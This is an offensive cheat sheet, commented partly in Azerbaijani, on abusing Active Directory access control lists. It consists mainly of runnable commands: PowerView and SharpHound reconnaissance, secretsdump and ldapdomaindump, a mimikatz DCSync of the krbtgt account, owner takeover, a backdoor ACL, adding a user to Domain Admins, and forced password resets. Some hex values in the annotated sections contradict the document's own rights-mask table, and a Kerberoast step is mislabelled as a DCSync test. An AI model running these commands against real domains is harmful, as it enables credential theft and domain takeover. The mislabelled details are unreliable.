# Access Control List Abuse
<img width="975" height="452" alt="image" src="https://github.com/user-attachments/assets/17d9ea44-b8ff-4610-928d-b7f608798107" />

## Access Control List Command
```
Import-Module .\PowerView.ps1
Get-Module ActiveDirectory

# Bütün domain obyektlərinin ACL xəritəsi
Get-DomainObjectAcl -ResolveGUIDs | Select ObjectDN,ActiveDirectoryRights,IdentityReference

# Riskli Hüquqlar
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|Owner|DeleteChild" } | ft ObjectDN,ActiveDirectoryRights,IdentityReference -AutoSize

# User ACL-ləri
Get-ObjectAcl -Identity <USER> -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite" }

# Group ACL-ləri
Get-ObjectAcl -Identity "<GROUP NAME>" -ResolveGUIDs

# Computer ACL-ləri
Get-ObjectAcl -Identity <COMPUTERNAME>$ -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite" }

# OU ACL-ləri (Child Creation Abuse)
Get-DomainOU | Get-ObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild" }

# Domain Root ACL
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectDN -match "^DC=" }

# SID-Based Targeted Hunt
$sid = Convert-NameToSid username

Get-DomainObjectACL -ResolveGUIDs -Identity * |
? { $_.SecurityIdentifier -eq $sid }

# Extended Rights Manual Analysis
$guid= "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
-Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |
Select Name,DisplayName,DistinguishedName,rightsGuid |
? { $_.rightsGuid -eq $guid }

# Group → MemberOf Chain Analysis
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

# Auto Discovery
Find-InterestingDomainAcl
```

## SharpHound
```
SharpHound.exe --CollectionMethods All --Domain domain.com --OutputDirectory C:\Users\htb-student\Desktop\bloodhound
```

## Impacket ilə LDAP ACL Enum
```
# DA ilə secretsdump + ACL parse
secretsdump.py domain/admin@dc-ip -just-dc

# ldapdomaindump (bütün ACL-lər)
ldapdomaindump -u 'domain\user' -p 'pass' dc-ip /tmp/ldapdump/
grep -r "GenericAll\|WriteDacl" /tmp/ldapdump/
```

## ACL Rights Mask-ları və Abuse Metodları
```

0x00000001  | CreateChild        | Alt obyekt yaratmaq (user/computer/OU creation, RBCD üçün machine account)
0x00000002  | DeleteChild        | Child obyekt silmək (DoS, GPO və ya admin hesabı silmək)
0x00000004  | ListChildren       | Child obyektləri görmək (Recon)
0x00000008  | Self               | Validated writes (məs. müəyyən hallarda SPN və ya xüsusi atribut dəyişiklikləri)
0x00000010  | ReadProperty       | Atributları oxumaq (SPN, LAPS, delegation info)
0x00000020  | WriteProperty      | Atribut dəyişmək (SPN add → targeted Kerberoast, RBCD, group member mod)
0x00000040  | DeleteTree         | Subtree silmək (struktur DoS)
0x00000080  | ListObject         | Gizli obyektləri görmək (Advanced recon)
0x00000100  | ExtendedRight      | Xüsusi hüquqlar (ResetPassword, DCSync – GUID-dən asılıdır)
0x00010000  | Delete             | Obyekti silmək (Admin hesabı / GPO silmək)
0x00020000  | ReadControl        | Security descriptor oxumaq (ACL recon)
0x00040000  | WriteDacl          | ACL dəyişmək (özünə hüquq əlavə edərək privilege escalation)
0x00080000  | WriteOwner         | Owner dəyişmək (takeover → sonra WriteDacl ilə full control)
0x10000000  | GenericAll         | Full control (ResetPass, ACL change, DCSync, persistence)
0x20000000  | GenericExecute     | Məhdud icra hüquqları (praktik eskalasiya nadir)
0x40000000  | GenericWrite       | Bir çox atributa write (SPN add → Kerberoasting, group takeover, RBCD)
0x80000000  | GenericRead        | Geniş oxuma hüququ (Kerberoast recon, LAPS read əgər qorunmayıbsa)

# DCSync icazəsi ilə NTDS dump
Get-DomainUser -Identity targetuser | Get-DomainSPNTicket  # Önce test
mimikatz.exe "lsadump::dcsync /domain:domain.com /user:krbtgt" exit

WriteOwner (0x20000) Abuse - Owner Takeover
# Owner-ı özünə dəyiş
Set-DomainObjectOwner -Identity "CN=targetuser,CN=Users,DC=domain,DC=com" -OwnerIdentity currentuser
# Sonra GenericAll əlavə et
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity currentuser -Rights All

WriteDacl (0x20000) Abuse - Backdoor ACL
$ACL = New-Object Security.AccessControl.ActiveDirectorySecurity
$ACE = New-Object Security.AccessControl.ActiveDirectoryAccessRule($UserSID,"GenericAll","Allow")
$ACL.AddAccessRule($ACE)
Set-DomainObject -Identity targetgroup -Replace @{'nTSecurityDescriptor'=$ACL}

GenericWrite (0x2) Abuse - Group Add/Password Reset
# Group-a add et (Domain Admins)
Add-DomainGroupMember -Identity "Domain Admins" -Members currentuser
# Password reset
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

ForceChangePassword Abuse
# SPN user üçün pass reset (Kerberoast sonrası)
Set-DomainUser -Identity svc-sql -AccountPassword (ConvertTo-SecureString "Summer20!$" -AsPlainText -Force) -SamAccountName svc-sql
```
